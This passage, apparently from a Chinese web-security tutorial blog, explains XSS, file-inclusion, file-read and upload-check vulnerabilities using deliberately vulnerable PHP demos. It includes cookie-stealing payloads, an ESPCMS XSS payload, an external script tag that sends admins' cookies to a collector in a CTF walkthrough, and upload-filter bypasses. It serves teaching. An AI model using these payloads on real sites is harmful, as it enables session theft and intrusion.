+<p>恶意利用(以获取用户cookie为例):<br>比如<code>http://xxx.com/xxx.php?aaa=攻击者编写的获取用户cookie的代码</code>存在反射型xss,<br>攻击者可以把构造好的链接发到论坛或者其他方式诱导用户点击,如果用户点击了链接,那么用户的cookie会被攻击者的服务器收到,攻击者可以利用用户的cookie登陆目标网站</p>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>数据经过了后端,经过了数据库。</p>
+<p>数据流向: 浏览器-&gt; 后端-&gt; 数据库-&gt; 后端-&gt; 浏览器</p>
+<p>eg:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table xss (</span><br><span class="line">    id int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">    payload varchar(100) NOT NULL,</span><br><span class="line">    PRIMARY KEY (id)</span><br><span class="line">)ENGINE&#x3D;MyISAM DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure>
+
+<p>storagexss.php(test on mysql 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">\\存储XSS演示</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"xss"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"test"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xss=@$_POST[<span class="string">'xss'</span>];</span><br><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">if</span>($xss!==<span class="keyword">null</span>)&#123;</span><br><span class="line">    $sql=<span class="string">"insert into xss(id,payload) values(1,'$xss')"</span>;</span><br><span class="line">    $result=mysql_query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>storagexsshow.php(test on mysql 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line">$sql=<span class="string">"select payload from xss"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row=mysql_fetch_array($result))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $row[<span class="string">'payload'</span>]; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>storagexss.php post:<code>&lt;img src=x onerror=alert(document.cookie)&gt;</code><br>访问storagexsshow.php会弹出cookie</p>
+<p>恶意利用(以评论区存在存储型xss为例):假如某网站评论区存在xss存储行漏洞,攻击者在评论中插入获取cookie的代码,当每个用户看到此评论时,他们的cookie都会被发送到攻击者服务器。</p>
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>没有经过后端,只在前端触发。</p>
+<p>数据流向是：URL–&gt;浏览器 </p>
+<p>eg:</p>
+<p>domxss.php(test on mysql 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//禁用错误报告</span></span><br><span class="line">$q = $_GET[<span class="string">"q"</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"q"</span> id=<span class="string">'text'</span> value=<span class="string">"&lt;?php echo $q;?&gt;"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"test"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;div id=<span class="string">"print"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> text = document.getElementById(<span class="string">"text"</span>); </span><br><span class="line"><span class="keyword">var</span> <span class="keyword">print</span> = document.getElementById(<span class="string">"print"</span>);</span><br><span class="line"><span class="keyword">print</span>.innerHTML = text.value + <span class="string">' not found'</span>; <span class="comment">// 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/domxss.php?q=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p>
+<p>恶意利用和反射型xss类似</p>
+<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>以ESPCMS P8.18101601n 前台XSS为例，问题主要由于错误页面的报错信息未作过滤，造成XSS漏洞。</p>
+<p>payload:<code>http://127.0.0.1/espcms/index.php?ac=%3C/code%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;at=List&amp;tid=7</code></p>
+<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><ul>
+<li>特殊字符HTML实体编码</li>
+<li>标签黑白名单(推荐白名单,黑名单可能存在不可预测的绕过)</li>
+<li>请求头设置HttpOnly属性(cookie不能通过js调用获取)</li>
+</ul>
+<h3 id="XSS-平台使用简要教程"><a href="#XSS-平台使用简要教程" class="headerlink" title="XSS 平台使用简要教程"></a>XSS 平台使用简要教程</h3><h4 id="找一个xss接收平台，并完成注册等一系列操作"><a href="#找一个xss接收平台，并完成注册等一系列操作" class="headerlink" title="找一个xss接收平台，并完成注册等一系列操作"></a>找一个xss接收平台，并完成注册等一系列操作</h4><p>这里以 <a href="https://xsshs.cn/" target="_blank" rel="noopener">https://xsshs.cn/</a> 做例子</p>
+<p><img src="https://s2.ax1x.com/2020/02/07/12BSxg.png" alt="12BSxg.png"></p>
+<p>登陆平台</p>
+<h4 id="创建和配置项目"><a href="#创建和配置项目" class="headerlink" title="创建和配置项目"></a>创建和配置项目</h4><p><img src="https://s2.ax1x.com/2020/02/07/12B9MQ.png" alt="12B9MQ.png"></p>
+<p><img src="https://s2.ax1x.com/2020/02/07/12BCrj.png" alt="12BCrj.png"></p>
+<p>填写好项目名称和描述（自定义）</p>
+<p>然后进行配置：</p>
+<p><img src="https://s2.ax1x.com/2020/02/07/120Oat.png" alt="120Oat.png"></p>
+<p>比如这里我们需要获取管理员的cookie，就勾上<img src="https://s2.ax1x.com/2020/02/07/120LVI.png" alt="120LVI.png"></p>
+<p>点击下一步</p>
+<p>就会进入到项目代码，注意，上面的代码都是已经封装好的了，包括接收url什么的，我们直接使用就可以了。</p>
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><img src="https://s2.ax1x.com/2020/02/07/120I2D.png" alt="120I2D.png"></p>
+<p>比如我们随便挑一个最简单的来使用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIpt srC=<span class="comment">//xs.sb/boJN&gt;&lt;/sCRipT&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们以C1CTF的xss题目来做例子</p>
+<p><img src="https://s2.ax1x.com/2020/02/07/120Hrd.png" alt="120Hrd.png"></p>
+<p>将代码复制到你觉得可能会产生xss的地方，这里点提交后，保存了在一个页面</p>
+<p><img src="https://s2.ax1x.com/2020/02/07/1204PK.png" alt="1204PK.png"></p>
+<p>当有用户（带cookie）访问这个页面的时候，此用户的cookie就会被获取并且发送到我们的平台，一般来说我们需要admin的cookie。这题的逻辑是直接发送页面id让管理员检查</p>
+<p><img src="https://s2.ax1x.com/2020/02/07/120vPf.png" alt="120vPf.png"></p>
+<p>然后就等着接收就可以了。</p>
+<h4 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h4><p>在平台里的项目内容里就可以查看到xss的结果了</p>
+<p><img src="https://s2.ax1x.com/2020/02/07/120xG8.png" alt="120xG8.png"></p>
+<h3 id="收集常见的XSS-payload"><a href="#收集常见的XSS-payload" class="headerlink" title="收集常见的XSS payload"></a>收集常见的XSS payload</h3><p><a href="https://packetstormsecurity.com/files/112152/Cross-Site-Scripting-Payloads.html" target="_blank" rel="noopener">Cross-Site-Scripting-Payloads</a></p>
+<h2 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h2><p>总的来说时因为没有经过严格的验证,操作的文件是否在允许的范围内。</p>
+<p>危害:</p>
+<ul>
+<li>导致恶意文件/代码包含</li>
+<li>导致敏感文件被读取</li>
+<li>导致文件被删除</li>
+<li>导致恶意文件上传</li>
+</ul>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含分为本地文件包含(local file include)、远程文件包含(remote file include)。文件包含可以导致恶意代码被包含,从而获取webshell</p>
+<p>文件包含利用函数:</p>
+<ul>
+<li>include(即使文件被包含过,也会再次包含,包含文件遇到错误代码也会继续执行)</li>
+<li>include_once(文件被包含过了,就不会再次包含,包含文件遇到错误也会继续执行)</li>
+<li>require(即使文件被包含过,也会再次包含,包含文件遇到错误程序直接退出)</li>
+<li>require_once(文件被包含过了,就不会再次包含,包含文件遇到错误程序直接退出)</li>
+<li>…</li>
+</ul>
+<p>本地文件包含(LFI):</p>
+<p>只能包含本机文件,大多出现在模块加载、模板加载和cache调用等地方。<br>本地文件包含方式也有多种,比如上传一个允许上传的文件格式的文件在包含,包含PHP上传的临时文件,webserver记录到日志后在包含webserver的日志,linux下可以包含/proc/self/environ文件等。</p>
+<p>eg:<br>localfileinclude.php(test on php 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"ROOT"</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>);</span><br><span class="line">$mod = $_GET[<span class="string">'mod'</span>];</span><br><span class="line"><span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>lfishell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/localfileinclude.php?mod=lfishell</code></p>
+<p>远程文件包含:</p>
+<p>可以包含远程文件。需要设置allow_url_include=on。支持http、ftp、php伪协议、zip、file等协议。</p>
+<p>eg:</p>
+<p>remotefileinclude.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用python开启一个见到的服务器:<br><code>python -m SimpleHTTPServer 8080</code></p>
+<p>rfi.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/remotefileinclude.php?url=http://127.0.0.1:8080/Desktop/rfi.txt</code></p>
+<p>使用伪协议(举两个伪协议例子):</p>
+<p>php://input</p>
+<ul>
+<li>allow_url_fopen：off/on</li>
+<li>allow_url_include：on<br><code>http://127.0.0.1/remotefileinclude.php?url=php://input</code><br><code>post: &lt;?php phpinfo();?&gt;</code></li>
+</ul>
+<p>php://filter</p>
+<ul>
+<li>allow_url_fopen：off/on</li>
+<li>allow_url_include：off/on<br><code>http://127.0.0.1/remotefileinclude.php?url=php://filter/read=convert.base64-encode/resource=remotefileinclude.php</code></li>
+</ul>
+<p>截断包含:</p>
+<p>00截断(受限于GPC和addslashes等函数影响,php5.3之后也不能使用这个方法,不过现在很少有这个漏洞了):</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'a'</span>].<span class="string">'.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>假如你发现了截断包含漏洞,然后又只能上传某些固定后缀的文件,那可以试下00截断</p>
+<p><code>http://127.0.0.1/truncatedinclude.php?a=aaa.txt%00</code></p>
+<p>多个<code>.</code>和<code>/</code>截断,不受GPC限制,但是在php5.3之后修复</p>
+<h3 id="文件读取-下载"><a href="#文件读取-下载" class="headerlink" title="文件读取(下载)"></a>文件读取(下载)</h3><p>程序在下载文件或者读取显示文件的时候,读取文件的参数直接在请求中传递,后台程序获取到这个文件后直接读取返回,问题在于这个参数是用户可控的,可以直接传入想要的文件路径。</p>
+<p>文件读取或者下载函数:</p>
+<ul>
+<li>file_get_contents</li>
+<li>high_light</li>
+<li>fopen</li>
+<li>readfile</li>
+<li>fread</li>
+<li>…</li>
+</ul>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = file_get_contents($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/fileread.php?file=aaa.txt</code></p>
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>如果能把文件上传到管理员或者应用程序不想让你上传的目录,那么就存在文件上传漏洞。</p>
+<p>一般的检测流程:</p>
+<ul>
+<li>客户端javascript校验（一般只校验文件的扩展名）</li>
+<li>服务端校验<ul>
+<li>文件头content-type字段校验（image/gif）</li>
+<li>文件内容头校验（GIF89a）</li>
+<li>目录路经检测（检测跟Path参数相关的内容）</li>
+<li>文件扩展名检测 (检测跟文件 extension 相关的内容)</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+<li>自定义正则校验</li>
+</ul>
+</li>
+<li>WAF设备校验（根据不同的WAF产品而定）</li>
+</ul>
+<p>利用函数:</p>
+<ul>
+<li>move_uploaded_file</li>
+</ul>
+<h3 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h3><p>jsupload.php (test on php 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//文件上传漏洞演示脚本之js验证</span></span><br><span class="line">$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($uploaddir)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>], $uploaddir . <span class="string">'/'</span> . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'文件上传成功，保存于：'</span> . $uploaddir . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>($uploaddir . <span class="string">'文件夹不存在,请手工创建！'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//print_r($_FILES);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">    &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;/title&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upfile'</span>)[<span class="number">0</span>].value;</span><br><span class="line">            <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">                alert(<span class="string">"你还没有选择任何文件，不能上传!"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">            <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.jpeg|.png|.gif|.bmp|"</span>;</span><br><span class="line">            <span class="comment">//提取上传文件的类型</span></span><br><span class="line">            <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">            <span class="comment">//alert(ext_name);</span></span><br><span class="line">            <span class="comment">//alert(ext_name + "|");</span></span><br><span class="line">            <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">            <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">                alert(errMsg);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span> onsubmit=<span class="string">"return checkFile()"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</span><br><span class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/jsupload.php</code></p>
+<p>判断方式：<br>在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
+<p>绕过方法：<br>将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp<br>上传页面，审查元素，修改JavaScript检测函数（具体方法：可以使用firebug之类的插件把它禁掉）</p>
+<h3 id="服务端检测"><a href="#服务端检测" class="headerlink" title="服务端检测"></a>服务端检测</h3><h4 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h4><p>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>] != <span class="string">"image/jpg"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uploaddir = <span class="string">'./uploads/'</span>;</span><br><span class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $uploadfile))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</span><br><span class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>绕过方法:<br>配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型</p>
+<h4 id="扩展名检测"><a href="#扩展名检测" class="headerlink" title="扩展名检测"></a>扩展名检测</h4><p>黑名单检测:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//sunstr - 返回字符串的子串</span></span><br><span class="line">    <span class="comment">//strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span></span><br><span class="line">    <span class="keyword">return</span> substr($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $black_file = explode(<span class="string">"|"</span>,<span class="string">"php|jsp|asp"</span>);<span class="comment">//允许上传的文件类型组</span></span><br><span class="line">    $new_upload_file_ext = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])); <span class="comment">//取得被.隔开的最后字符串</span></span><br><span class="line">    <span class="keyword">if</span>(in_array($new_upload_file_ext,$black_file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件不合法"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span 